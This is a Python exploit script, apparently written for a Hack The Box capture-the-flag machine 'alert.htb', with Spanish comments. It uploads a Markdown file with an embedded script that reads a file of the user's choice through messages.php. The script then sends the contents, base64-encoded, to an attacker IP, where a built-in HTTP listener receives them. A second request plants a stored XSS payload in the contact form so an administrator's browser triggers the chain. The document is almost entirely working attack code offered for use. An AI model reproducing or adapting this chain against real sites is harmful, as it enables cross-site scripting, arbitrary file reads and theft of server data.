import re
import time
import base64
import requests
import argparse
import threading
import socketserver
from http.server import HTTPServer, BaseHTTPRequestHandler

PORT = 8000

class RequestHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        # Extraer los datos del query string
        query = self.path.split('?')[1] if '?' in self.path else ''
        if query:
            # Decodificar el contenido
            decoded_data = base64.b64decode(query).decode('utf-8')
            print("[+] Contenido recibido y decodificado:\n")
            print(decoded_data)
        threading.Thread(target=self.server.shutdown).start()

def start_server():
    with socketserver.TCPServer(("", PORT), RequestHandler) as httpd:
        print(f"[+] Servidor atacante escuchando por el puerto {PORT}...")
        httpd.serve_forever()

def main():
    parser = argparse.ArgumentParser(description="Script para enviar dos peticiones secuenciales con URLs dinámicas.")
    parser.add_argument("target_file", help="Ruta del archivo objetivo que será solicitado en la primera URL (e.g., etc/passwd).")
    parser.add_argument("attacker_ip", help="IP del atacante donde se enviará el archivo leído.")
    args = parser.parse_args()

    # Primera solicitud
    url_visualizer = "http://alert.htb/visualizer.php"
    headers_visualizer = {
        "Host": "alert.htb",
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate, br",
        "Origin": "http://alert.htb",
        "Referer": "http://alert.htb/index.php?page=alert",
        "Upgrade-Insecure-Requests": "1",
    }

    payload = f"""<script>
fetch("http://alert.htb/messages.php?file={args.target_file}")
  .then(response => response.text())
  .then(data => {{
      fetch("http://{args.attacker_ip}:{PORT}/?"+btoa(data));
  }});
</script>
"""

    files = {
        "file": ("README.md", payload, "text/markdown"),
    }

    response1 = requests.post(url_visualizer, headers=headers_visualizer, files=files)

    # Verificar el resultado de la primera solicitud
    if response1.status_code != 200:
        print(f"Error en la primera petición: {response1.status_code}")
        return

    # Extraer el link_share de la respuesta
    match = re.search(r'href="(http://alert\.htb/visualizer\.php\?link_share=[^"]+)"', response1.text)
    if not match:
        print("No se pudo encontrar el enlace `link_share` en la respuesta.")
        return

    link_share_url = match.group(1)

    # Iniciar el servidor HTTP en un hilo separado
    server_thread = threading.Thread(target=start_server, daemon=False)
    server_thread.start()

    time.sleep(0.1)

    # Segunda solicitud
    url_contact = "http://alert.htb/contact.php"
    headers_contact = {
        "Host": "alert.htb",
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate, br",
        "Origin": "http://alert.htb",
        "Referer": "http://alert.htb/index.php?page=contact",
        "Upgrade-Insecure-Requests": "1",
        "Content-Type": "application/x-www-form-urlencoded",
    }

    message_payload = f"email=test%40test.com&message=%3Cscript%3Efetch%28%22{link_share_url}%22%29%3B%3C%2Fscript%3E"
    response2 = requests.post(url_contact, headers=headers_contact, data=message_payload)

    # Verificar el resultado de la segunda solicitud
    if response2.status_code != 200:
        print(f"Error en la segunda petición: {response2.status_code}")

if __name__ == "__main__":
    main()
